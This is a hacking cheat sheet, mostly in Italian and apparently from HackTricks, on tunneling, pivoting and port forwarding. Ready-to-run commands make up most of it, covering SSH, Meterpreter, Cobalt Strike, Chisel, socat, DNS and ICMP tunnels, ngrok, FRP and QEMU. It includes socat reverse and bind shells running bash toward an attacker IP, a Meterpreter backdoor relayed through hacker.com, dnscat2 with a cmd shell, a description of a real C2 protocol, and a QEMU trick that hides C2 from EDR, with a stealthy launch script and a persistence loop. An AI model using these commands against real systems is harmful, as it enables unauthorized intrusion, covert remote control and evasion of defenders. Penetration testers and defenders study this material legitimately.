# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Suggerimento Nmap

> [!WARNING]
> **ICMP** e **SYN** scans non possono essere tunnelled attraverso socks proxies, quindi dobbiamo **disable ping discovery** (`-Pn`) e specificare **TCP scans** (`-sT`) per far sì che funzioni.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Connessione grafica SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Apri una nuova Port sul SSH Server --> altra Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Local port --> host compromesso (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Porta locale --> Host compromesso (SSH) --> Ovunque
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Questo è utile per ottenere reverse shells da host interni attraverso una DMZ verso il tuo host:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Hai bisogno di **root su entrambi i dispositivi** (dato che creerai nuove interfacce) e la configurazione di sshd deve permettere il login di root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Abilitare il forwarding sul lato Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Imposta una nuova route sul client
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Sicurezza – Terrapin Attack (CVE-2023-48795)**
> Il Terrapin downgrade attack del 2023 può permettere a un man-in-the-middle di manomettere la handshake SSH iniziale e iniettare dati in **qualsiasi canale inoltrato** (`-L`, `-R`, `-D`). Assicurati che sia client che server siano patchati (**OpenSSH ≥ 9.6/LibreSSH 6.7**) oppure disabilita esplicitamente gli algoritmi vulnerabili `chacha20-poly1305@openssh.com` e `*-etm@openssh.com` in `sshd_config`/`ssh_config` prima di fare affidamento su SSH tunnels.

## SSHUTTLE

Puoi **tunnelare** via **ssh** tutto il **traffico** verso una **sottorete** attraverso un host.\
Per esempio, inoltrando tutto il traffico destinato a 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Connettersi con una chiave privata
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Port locale --> Host compromesso (sessione attiva) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Un altro modo:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Apri una porta sul teamserver che ascolti su tutte le interfacce e che possa essere usata per **instradare il traffico attraverso il beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> In questo caso, la **porta viene aperta nel beacon host**, non nel Team Server e il traffico viene inviato al Team Server e da lì all'host:port indicato.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Da notare:

- Beacon's reverse port forward è progettato per **tunnel traffic to the Team Server, not for relaying between individual machines**.
- Il traffico è **tunneled within Beacon's C2 traffic**, inclusi P2P links.
- **Admin privileges are not required** per creare reverse port forwards su high ports.

### rPort2Port local

> [!WARNING]
> In questo caso, la **port is opened in the beacon host**, non nel Team Server, e il **traffic is sent to the Cobalt Strike client** (non nel Team Server) e da lì verso l'host:port indicato
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeOrg)

Devi caricare un file tunnel web: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Puoi scaricarlo dalla pagina releases di [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Devi usare **la stessa versione per client e server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Inoltro porte
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Usare la stessa versione per agent e proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Binding e ascolto dell'Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Accesso alle porte locali dell'Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Il tunnel viene avviato dalla vittima.\
Viene creato un socks4 proxy su 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot attraverso **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port tramite socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter tramite SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Puoi aggirare un **non-authenticated proxy** eseguendo questa riga invece dell'ultima nella console della vittima:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Tunnel SSL con Socat

**/bin/sh console**

Creare i certificati su entrambi i lati: Client e Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Connetti la porta SSH locale (22) alla porta 443 dell'attacker host
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

È come una versione console di PuTTY (le opzioni sono molto simili a quelle di un ssh client).

Poiché questo binary verrà eseguito sulla vittima ed è un ssh client, dobbiamo aprire il nostro servizio ssh e la porta in modo da poter avere una reverse connection. Poi, per forwardare solo una porta accessibile localmente verso una porta sulla nostra macchina:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

È necessario essere local admin (per qualsiasi porta)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Devi avere **accesso RDP sul sistema**.\
Scarica:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo tool utilizza `Dynamic Virtual Channels` (`DVC`) della funzionalità Remote Desktop Service di Windows. DVC è responsabile del **tunneling dei pacchetti sulla connessione RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Sul tuo computer client carica **`SocksOverRDP-Plugin.dll`** in questo modo:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Ora possiamo **connetterci** alla **victim** tramite **RDP** usando **`mstsc.exe`**, e dovremmo ricevere un **prompt** che indica che il **SocksOverRDP plugin è abilitato**, e che **ascolterà** su **127.0.0.1:1080**.

**Connettiti** via **RDP** e carica & esegui sulla macchina **victim** il binario `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Ora, conferma sulla tua macchina (attacker) che la porta 1080 sia in ascolto:
```
netstat -antb | findstr 1080
```
Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per instradare il traffico tramite proxy attraverso quella porta.**

## Proxify app GUI di Windows

Puoi far sì che le app GUI di Windows navighino tramite un proxy usando [**Proxifier**](https://www.proxifier.com/).\
In **Profile -> Proxy Servers** aggiungi l'IP e la porta del server SOCKS.\
In **Profile -> Proxification Rules** aggiungi il nome del programma da instradare tramite proxy e le connessioni verso gli IP che vuoi instradare.

## NTLM proxy bypass

Lo strumento menzionato in precedenza: **Rpivot**\
**OpenVPN** può anche aggirarlo, impostando queste opzioni nel file di configurazione:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Si autentica contro un proxy e apre una port locale che viene inoltrata al servizio esterno che specifichi. Poi puoi usare lo strumento che preferisci attraverso questa port.\
Ad esempio, inoltra la port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Now, if you set for example in the victim the **SSH** service to listen in port 443. You can connect to it through the attacker port 2222.\ You could also use a **meterpreter** that connects to localhost:443 and the attacker is listening in port 2222.

## YARP

Un proxy inverso creato da Microsoft. Puoi trovarlo qui: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root è necessario in entrambi i sistemi per creare tun adapters e trasferire dati tra di essi usando DNS queries.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Il tunnel sarà molto lento. Puoi creare una connessione SSH compressa attraverso questo tunnel usando:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

Stabilisce un canale C\&C tramite DNS. Non necessita di root privileges.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Puoi usare [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) per eseguire un dnscat2 client in powershell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding con dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Cambia DNS di proxychains

Proxychains intercetta la chiamata libc `gethostbyname` e inoltra le richieste DNS TCP attraverso il proxy SOCKS. Per **default** il server **DNS** che proxychains usa è **4.2.2.2** (hardcoded). Per cambiarlo, modifica il file: _/usr/lib/proxychains3/proxyresolv_ e cambia l'IP. Se ti trovi in un **Windows environment** puoi impostare l'IP del **domain controller**.

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### C2 DNS TXT/HTTP JSON personalizzato (AK47C2)

L'attore Storm-2603 ha creato un **C2 a doppio canale ("AK47C2")** che sfrutta *soltanto* il traffico in uscita **DNS** e **plain HTTP POST** – due protocolli raramente bloccati nelle reti aziendali.

1. **Modalità DNS (AK47DNS)**
• Genera un SessionID casuale di 5 caratteri (e.g. `H4T14`).
• Preappone `1` per le *task requests* o `2` per i *results* e concatena diversi campi (flags, SessionID, nome del computer).
• Ogni campo è **XOR-encrypted with the ASCII key `VHBD@H`**, codificato in esadecimale e unito con dei punti – termina infine con il dominio controllato dall'attaccante:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Le richieste usano `DnsQuery()` per record **TXT** (e come fallback **MG**) .
• Quando la risposta supera 0xFF bytes il backdoor **frammenta** i dati in pezzi da 63 byte e inserisce i marker:
`s<SessionID>t<TOTAL>p<POS>` così il server C2 può riorganizzarli.

2. **Modalità HTTP (AK47HTTP)**
• Costruisce un involucro JSON:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• L'intero blob è XOR-`VHBD@H` → hex → inviato come corpo di una **`POST /`** con header `Content-Type: text/plain`.
• La risposta segue la stessa codifica e il campo `cmd` viene eseguito con `cmd.exe /c <command> 2>&1`.

Note per il Blue Team
• Cerca query **TXT** insolite il cui primo label è una lunga stringa esadecimale e che finiscono sempre con un dominio raro.
• Una chiave XOR costante seguita da ASCII-hex è facile da rilevare con YARA: `6?56484244?484` (`VHBD@H` in hex).
• Per HTTP, segnala i corpi di POST text/plain che sono puro esadecimale e multipli di due byte.

{{#note}}
L'intero canale rientra nelle **query conformi agli RFC standard** e mantiene ciascun label di sottodominio sotto i 63 byte, rendendolo furtivo nella maggior parte dei log DNS.
{{#endnote}}

## Tunnel ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

È necessario root su entrambi i sistemi per creare interfacce tun e incanalare i dati tra loro usando richieste ICMP echo.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Scaricalo da qui**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **è uno strumento per esporre soluzioni su Internet con un solo comando.**\
_Gli URI di esposizione sono del tipo:_ **UID.ngrok.io**

### Installazione

- Crea un account: https://ngrok.com/signup
- Download del client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Utilizzi di base

**Documentazione:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_È anche possibile aggiungere autenticazione e TLS, se necessario._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Esporre file tramite HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Utile per XSS,SSRF,SSTI ..._\
Direttamente da stdout o nell'interfaccia HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling internal HTTP service
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml esempio di configurazione semplice

Apre 3 tunnel:

- 2 TCP
- 1 HTTP con esposizione di file statici da /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Il demone `cloudflared` di Cloudflare può creare tunnel in uscita che espongono **local TCP/UDP services** senza richiedere inbound firewall rules, usando Cloudflare’s edge come punto d'incontro. Questo è molto utile quando l'egress firewall consente solo traffico HTTPS ma le connessioni in ingresso sono bloccate.

### One-liner rapido per tunnel
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Tunnel persistenti con DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Avvia il connettore:
```bash
cloudflared tunnel run mytunnel
```
Poiché tutto il traffico esce dall'host **outbound over 443**, i tunnel Cloudflared sono un modo semplice per bypassare le ACL di ingresso o i confini NAT. Tieni presente che il binario solitamente gira con privilegi elevati – usa container o il flag `--user` quando possibile.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) è un reverse-proxy Go attivamente mantenuto che supporta **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. A partire da **v0.53.0 (May 2024)** può comportarsi come un **SSH Tunnel Gateway**, così un host target può avviare un reverse tunnel usando solo il client OpenSSH di serie – nessun binario aggiuntivo richiesto.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Uso del nuovo SSH gateway (senza binario frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Il comando sopra pubblica la porta della vittima **8080** come **attacker_ip:9000** senza distribuire strumenti aggiuntivi – ideale per living-off-the-land pivoting.

## Tunnel nascosti basati su VM con QEMU

Il networking in user-mode di QEMU (`-netdev user`) supporta un'opzione chiamata `hostfwd` che **lega una porta TCP/UDP sul *host* e la inoltra nel *guest***. Quando il guest esegue un SSH daemon completo, la regola hostfwd ti fornisce un SSH jump box usa-e-getta che vive interamente all'interno di una VM effimera – perfetto per nascondere il traffico C2 dall'EDR perché tutta l'attività e i file maligni restano nel disco virtuale.

### One-liner rapido
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Il comando sopra avvia un'immagine di **Tiny Core Linux** (`tc.qcow2`) in RAM.
• La porta **2222/tcp** sull'host Windows viene inoltrata in modo trasparente alla porta **22/tcp** all'interno del guest.
• Dal punto di vista dell'attacker, il target semplicemente espone la porta 2222; tutti i pacchetti che la raggiungono sono gestiti dal server SSH in esecuzione nella VM.

### Lancio furtivo tramite VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
L'esecuzione dello script con `cscript.exe //B update.vbs` mantiene la finestra nascosta.

### Persistenza in guest

Poiché Tiny Core è senza stato, gli attaccanti di solito:

1. Drop payload to `/opt/123.out`
2. Append to `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Add `home/tc` and `opt` to `/opt/filetool.lst` so the payload is packed into `mydata.tgz` on shutdown.

### Perché questo elude il rilevamento

• Only two unsigned executables (`qemu-system-*.exe`) touch disk; no drivers or services are installed.  
• I prodotti di sicurezza sull'host vedono **benign loopback traffic** (il vero C2 termina all'interno della VM).  
• Gli scanner di memoria non analizzano mai lo spazio dei processi malevoli perché si trova in un OS diverso.

### Suggerimenti per i difensori

• Segnala la presenza di **unexpected QEMU/VirtualBox/KVM binaries** in percorsi scrivibili dagli utenti.  
• Blocca le connessioni in uscita originate da `qemu-system*.exe`.  
• Cerca porte di ascolto rare (2222, 10022, …) che vengono aperte immediatamente dopo l'avvio di QEMU.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
